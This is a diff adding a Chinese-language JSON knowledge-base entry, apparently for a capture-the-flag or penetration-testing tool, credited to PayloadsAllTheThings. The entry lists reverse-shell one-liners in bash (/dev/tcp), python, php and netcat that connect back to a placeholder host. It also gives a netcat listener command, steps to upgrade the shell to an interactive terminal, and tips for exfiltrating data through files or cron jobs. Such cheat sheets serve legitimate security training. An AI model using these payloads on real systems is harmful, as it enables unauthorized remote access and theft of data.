@@ -1,0 +1,15 @@
+{
+  "id": "kb032",
+  "title": "反弹 shell 与升级交互",
+  "description": "一句话反弹汇总 + 伪终端升级",
+  "detail": "bash: bash -i >& /dev/tcp/MY/PORT 0>&1\npython: python3 -c 'import socket,subprocess,os;...dup2...'（经典一行）\nphp: php -r '$sock=fsockopen(\"MY\",PORT);exec(\"sh <&3 >&3 2>&3\");'\nnc 有 -e: nc -e /bin/sh MY PORT；无 -e 用管道 mkfifo\n升级交互：python3 -c 'import pty;pty.spawn(\"/bin/bash\")' → Ctrl-Z → stty raw -echo; fg → export TERM=xterm\n监听：nc -lvnp PORT\n不回显环境：写文件/定时任务外带；纯 TCP 报错构造（见命令注入条目）\n拿到 shell 三件事：id/whoami、找 flag、记录 loot fact。",
+  "commands": [
+    "nc -lvnp 9001"
+  ],
+  "tags": [
+    "post",
+    "shell"
+  ],
+  "source": "PayloadsAllTheThings",
+  "created_at": "2026-10-15T14:14:38Z"
+}
